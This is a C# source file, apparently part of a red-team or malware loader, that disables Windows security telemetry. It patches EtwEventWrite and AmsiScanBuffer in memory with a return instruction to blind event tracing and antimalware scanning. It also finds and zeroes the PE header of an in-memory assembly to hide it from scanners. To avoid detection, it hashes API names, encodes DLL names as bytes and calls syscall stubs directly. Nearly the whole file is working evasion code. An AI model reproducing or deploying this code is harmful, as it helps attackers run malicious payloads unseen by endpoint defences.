using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using SpDi2;
using System.Text;
using System.Dynamic;
using System.Runtime.CompilerServices;
using System.Security.Permissions;
//using SpDi;

namespace LightsOut
{
    public class LoGo
    {
        static byte[] sixFour = new byte[] { 0xC3 };
        static byte[] eSixFour = new byte[] { 0xC3 };
        
        static Byte[] peHeader = new Byte[] { 0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68, 0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20, 0x6D, 0x6F, 0x64, 0x65 };

        public static void LoEtw()
        {
            try
            {
                string decN = Encoding.ASCII.GetString(new byte[] { 110, 116, 100, 108, 108, 46, 100, 108, 108 });
                
                String write = Generic.GetAPIHash("EtwEventWrite", 0xfeedfeed);
                IntPtr pEtw = SpDi2.Generic.GetLibraryAddress(decN, write, 0xfeedfeed, true);
                Console.WriteLine("[>] pEtw address: " + string.Format("{0:X}", pEtw.ToInt64()));
                               
                uint cOld = 0;
                
                object[] funcargs =
                {
                    pEtw, (IntPtr)eSixFour.Length, (uint)0x40, cOld
                };

                SpDi.PE.PE_MANUAL_MAP modDet = SpDi.Map.MapModuleToMemory("c:\\Windows\\System32\\kernel32.dll");
                bool vProtect = (bool)Generic.CallMappedDLLModuleExport(modDet.PEINFO, modDet.ModuleBase, "VirtualProtect", typeof(Win32.Delegates.VirtualProtect), funcargs);

                Marshal.Copy(eSixFour, 0, pEtw, eSixFour.Length);
                
                Process currentProcess = Process.GetCurrentProcess();
                var region = (IntPtr)eSixFour.Length;
                Native.NtProtectVirtualMemory(currentProcess.Handle, ref pEtw, ref region, 0x20);
               
            }

            catch (System.Exception)
            {

                throw;
            }
        }
        
        public static void LoIsma()
        {

            try
            {
                string decL = Encoding.ASCII.GetString(new byte[] { 97, 109, 115, 105, 46, 100, 108, 108 });
               
                String cima = Generic.GetAPIHash("AmsiScanBuffer", 0xfeedfeed);
                IntPtr pIsma = SpDi2.Generic.GetLibraryAddress(decL, cima, 0xfeedfeed, true);
                Console.WriteLine("[>] amcib0ff address(s): " + string.Format("{0:X}", pIsma.ToInt64()));

                Process currentProcess = Process.GetCurrentProcess();
                var region = (IntPtr)sixFour.Length;

                Native.NtProtectVirtualMemory(currentProcess.Handle, ref pIsma, ref region, 0x04);

                Marshal.Copy(sixFour, 0, pIsma, sixFour.Length);

                Native.NtProtectVirtualMemory(currentProcess.Handle, ref pIsma, ref region, 0x20);

               
            }

            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
                Console.WriteLine(" [x] {0}", e.InnerException);
            }
        }

        public static int LoPEHeader()
        {
            
            uint oldProtect = 0;
            SpDi.Win32.Kernel32.PE_SYSTEM_INFO sys_info = new SpDi.Win32.Kernel32.PE_SYSTEM_INFO();
            SpDi2.Win32.GetSystemInfo(ref sys_info);
            
            UIntPtr proc_min_address = sys_info.minimumApplicationAddress;
            UIntPtr proc_max_address = sys_info.maximumApplicationAddress;
            
            ulong proc_min_address_l = (ulong)proc_min_address;
            ulong proc_max_address_l = (ulong)proc_max_address;
            
            Process currentProcess = Process.GetCurrentProcess();
            SpDi.Win32.WinNT.PE_MEMORY_BASIC_INFORMATION mem_basic_info = new SpDi.Win32.WinNT.PE_MEMORY_BASIC_INFORMATION();

            String query = Generic.GetAPIHash("VirtualQueryEx", 0xfeedfeed);
            var pointer = SpDi2.Generic.GetLibraryAddress("kernel32.dll", query, 0xfeedfeed, true);
            var virtualQuery = Marshal.GetDelegateForFunctionPointer(pointer, typeof(SpDi2.Win32.Delegates.VirtualQueryEx)) as SpDi2.Win32.Delegates.VirtualQueryEx;

            //'bytesRead' was from 'sniper' scanner remove if below is removed as well
            uint bytesRead = 0;
            virtualQuery(currentProcess.Handle, proc_min_address, out mem_basic_info, Marshal.SizeOf(typeof(SpDi.Win32.WinNT.PE_MEMORY_BASIC_INFORMATION)));
            
            //this part can be removed as it was only used to find PE header as opposed to just stomping the first 132
            //resume where the 'else' block is 
            //of course see the original code from MDSec blog
            if (((mem_basic_info.Protect == SpDi.Win32.WinNT.PAGE_EXECUTE_READWRITE) || (mem_basic_info.Protect == SpDi.Win32.WinNT.PAGE_EXECUTE_READ)) && mem_basic_info.State == SpDi.Win32.WinNT.PE_MEM_COMMIT)
            {
                byte[] buffer = new byte[mem_basic_info.RegionSize];

                String dash = Generic.GetAPIHash("ReadProcessMemory", 0xfeedfeed);
                var fetch = SpDi2.Generic.GetLibraryAddress("kernel32.dll", dash, 0xfeedfeed, true);
                var readMem = Marshal.GetDelegateForFunctionPointer(pointer, typeof(SpDi2.Win32.Delegates.ReadProcessMemory)) as SpDi2.Win32.Delegates.ReadProcessMemory;
                readMem(currentProcess.Handle, mem_basic_info.BaseAddress, buffer, mem_basic_info.RegionSize, ref bytesRead);
                IntPtr Result = _Scan(buffer, peHeader);

                if (Result != IntPtr.Zero)
                {
                    Console.WriteLine("!!! Found PE binary in region: 0x{0}, Region Sz 0x{1}", (mem_basic_info.BaseAddress).ToString("X"), (mem_basic_info.RegionSize).ToString("X"));

                    virtualQuery(currentProcess.Handle, proc_min_address, out mem_basic_info, Marshal.SizeOf(typeof(SpDi.Win32.WinNT.PE_MEMORY_BASIC_INFORMATION)));
                    Console.WriteLine("Execute-Assembly Base Address: 0x{0}", mem_basic_info.BaseAddress.ToString("X"));

                    IntPtr pSysCall = Generic.GetSyscallStub("NtProtectVirtualMemory");
                    Console.WriteLine("[>] Ex-Assembly PE pSysCall   : " + String.Format("{0:X}", (pSysCall).ToInt64()));
                    Native.DELEGATES.NtProtectVirtualMemoryLoPE fSysCallNtProtectVirtualMemory = (Native.DELEGATES.NtProtectVirtualMemoryLoPE)Marshal.GetDelegateForFunctionPointer(pSysCall, typeof(Native.DELEGATES.NtProtectVirtualMemoryLoPE));
                    UInt32 result = fSysCallNtProtectVirtualMemory(currentProcess.Handle, ref mem_basic_info.BaseAddress, ref mem_basic_info.RegionSize, 0x04, ref oldProtect);
                    Console.WriteLine("[?] Ex-Assembly PE NtProtectVirtualMemory   : " + String.Format("{0:X}", result));
                    //bool earesult = SpDi2.Win32.VirtualProtect((IntPtr)mem_basic_info.BaseAddress, (UIntPtr)4096, (uint)SpDi.Win32.Kernel32.MemoryProtectionConsts.READWRITE, ref oldProtect);

                    String eafill = Generic.GetAPIHash("RtlFillMemory", 0xfeedfeed);
                    IntPtr eapFunction = Generic.GetLibraryAddress(@"ntdll.dll", eafill, 0xfeedfeed, true);
                    Native.DELEGATES.RtlFillMemory eafillMem = (Native.DELEGATES.RtlFillMemory)Marshal.GetDelegateForFunctionPointer(eapFunction, typeof(Native.DELEGATES.RtlFillMemory));
                    eafillMem((IntPtr)mem_basic_info.BaseAddress, 132, 0);

                    Console.WriteLine("Execute-Assembly PE Header overwritten at 0x{0}", mem_basic_info.BaseAddress.ToString("X"));
                }
            }
            
            else
            {
                proc_min_address_l += mem_basic_info.RegionSize;
                proc_min_address = new UIntPtr(proc_min_address_l);

                virtualQuery(currentProcess.Handle, proc_min_address, out mem_basic_info, Marshal.SizeOf(typeof(SpDi.Win32.WinNT.PE_MEMORY_BASIC_INFORMATION)));
                Console.WriteLine("Base Address: 0x{0}", mem_basic_info.BaseAddress.ToString("X"));

                IntPtr pSysCall = Generic.GetSyscallStub("NtProtectVirtualMemory");
                Console.WriteLine("[>] PE pSysCall   : " + String.Format("{0:X}", (pSysCall).ToInt64()));
                Native.DELEGATES.NtProtectVirtualMemoryLoPE fSysCallNtProtectVirtualMemory = (Native.DELEGATES.NtProtectVirtualMemoryLoPE)Marshal.GetDelegateForFunctionPointer(pSysCall, typeof(Native.DELEGATES.NtProtectVirtualMemoryLoPE));
                UInt32 result = fSysCallNtProtectVirtualMemory(currentProcess.Handle, ref mem_basic_info.BaseAddress, ref mem_basic_info.RegionSize, 0x04, ref oldProtect);
                Console.WriteLine("[?] PE NtProtectVirtualMemory   : " + String.Format("{0:X}", result));
                //bool result = SpDi2.Win32.VirtualProtect((IntPtr)mem_basic_info.BaseAddress, (UIntPtr)4096, (uint)SpDi.Win32.Kernel32.MemoryProtectionConsts.READWRITE, ref oldProtect);

                String fill = Generic.GetAPIHash("RtlFillMemory", 0xfeedfeed);
                IntPtr pFunction = Generic.GetLibraryAddress(@"ntdll.dll", fill, 0xfeedfeed, true);
                Native.DELEGATES.RtlFillMemory fillMem = (Native.DELEGATES.RtlFillMemory)Marshal.GetDelegateForFunctionPointer(pFunction, typeof(Native.DELEGATES.RtlFillMemory));
                fillMem((IntPtr)mem_basic_info.BaseAddress, 132, 0);

                Console.WriteLine("PE Header overwritten at 0x{0}", mem_basic_info.BaseAddress.ToString("X"));
            }    
           
            return 0;
         }

         public static IntPtr _Scan(byte[] sIn, byte[] sFor)
         {
            int[] sBytes = new int[256]; int Pool = 0;
            int End = sFor.Length - 1;
            for (int i = 0; i < 256; i++)
                sBytes[i] = sFor.Length;
            for (int i = 0; i < End; i++)
                sBytes[sFor[i]] = End - i;
            while (Pool <= sIn.Length - sFor.Length)
            {
                for (int i = End; sIn[Pool + i] == sFor[i]; i--)
                    if (i == 0) return new IntPtr(Pool);
                Pool += sBytes[sIn[Pool + End]];
            }
            return IntPtr.Zero;
         }

    }
    
}
